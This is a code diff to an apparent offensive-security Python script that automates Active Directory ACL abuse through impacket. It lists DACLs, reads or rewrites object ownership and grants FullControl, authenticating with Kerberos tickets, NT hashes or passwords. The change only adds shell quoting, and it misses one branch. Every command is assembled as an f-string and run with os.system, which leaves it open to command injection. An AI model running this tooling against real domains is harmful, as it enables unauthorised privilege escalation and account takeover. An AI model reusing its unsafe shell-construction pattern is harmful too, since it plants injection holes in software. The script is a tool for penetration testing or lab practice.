@@ -7,11 +7,11 @@ def list_acl(box, path):
     os.chdir(path.ws_enum)
     print('\033[93m[*]\033[0m List ACL')
     if box.krb:
-        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -principal {box.username} -target {box.target}"
+        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -principal {box.username} -target '{box.target}'"
     elif box.nt_hash:
-        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -principal {box.username} -target {box.target}"
+        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -principal {box.username} -target '{box.target}'"
     else:
-        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -target {box.target} -principal {box.username}"
+        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -target {box.target} -principal '{box.username}'"
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd + f' 2>&1 | tee acl_{box.username}_to_{box.target}.out')
@@ -22,11 +22,11 @@ def read_write_owner(box, action):
     config.required_target(box)
     print(f'\033[93m[*]\033[0m {action} owner')
     if box.krb:
-        cmd = f"{box.krb} impacket-owneredit {box.domain}/{box.username} -k -no-pass -action {action} -new-owner {box.username} -target {box.target}"
+        cmd = f"{box.krb} impacket-owneredit {box.domain}/{box.username} -k -no-pass -action {action} -new-owner {box.username} -target '{box.target}'"
     elif box.nt_hash:
-        cmd = f"impacket-owneredit {box.domain}/{box.username} -hashes :{box.nt_hash} -action {action} -new-owner {box.username} -target {box.target}"
+        cmd = f"impacket-owneredit {box.domain}/{box.username} -hashes :{box.nt_hash} -action {action} -new-owner {box.username} -target '{box.target}'"
     else:
-        cmd = f"impacket-owneredit {box.domain}/{box.username}:'{box.password}' -action {action} -new-owner {box.username} -target {box.target}"
+        cmd = f"impacket-owneredit {box.domain}/{box.username}:'{box.password}' -action {action} -new-owner {box.username} -target '{box.target}'"
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
@@ -37,11 +37,11 @@ def dacledit(box):
     config.required_target(box)
     print(f'\033[93m[*]\033[0m dacledit FullControl')
     if box.krb:
-        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -action write -rights FullControl -principal {box.username} -target {box.target}"
+        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -action write -rights FullControl -principal {box.username} -target '{box.target}'"
     elif box.nt_hash:
-        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -action write -rights FullControl -principal {box.username} -target {box.target}"
+        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -action write -rights FullControl -principal {box.username} -target '{box.target}'"
     else:
-        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -action write -rights FullControl -principal {box.username} -target {box.target}"
+        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -action write -rights FullControl -principal {box.username} -target '{box.target}'"
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
